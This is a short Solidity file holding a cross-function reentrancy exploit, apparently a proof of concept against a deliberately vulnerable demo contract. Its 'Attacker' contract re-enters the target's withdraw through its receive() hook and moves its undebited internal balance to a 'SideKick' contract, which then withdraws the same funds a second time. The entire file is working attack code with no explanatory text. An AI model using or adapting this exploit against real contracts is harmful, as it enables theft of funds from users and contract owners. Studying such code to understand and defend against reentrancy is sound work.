// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

interface IVulnerable {
    function withdraw() external;
    function deposit() external payable;
    function transferToInternally(address _recipient, uint256 _amount) external;
    function userBalance(address _user) external view returns (uint256);
}

interface ISidekick {
    function exploit() external;
}

contract Attacker {
    IVulnerable public target;
    ISidekick public sidekick;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function setSidekick(address _sidekick) public {
        sidekick = ISidekick(_sidekick);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.transferToInternally(address(sidekick), target.userBalance(address(this)));
        }
    }

    function initiate() public payable {
        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    function exploit() public {
        target.withdraw();
    }
}

contract SideKick {
    IVulnerable public target;
    ISidekick public sidekick;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function setSidekick(address _sidekick) public {
        sidekick = ISidekick(_sidekick);
    }

    function exploit() public {
        target.withdraw();
    }
}
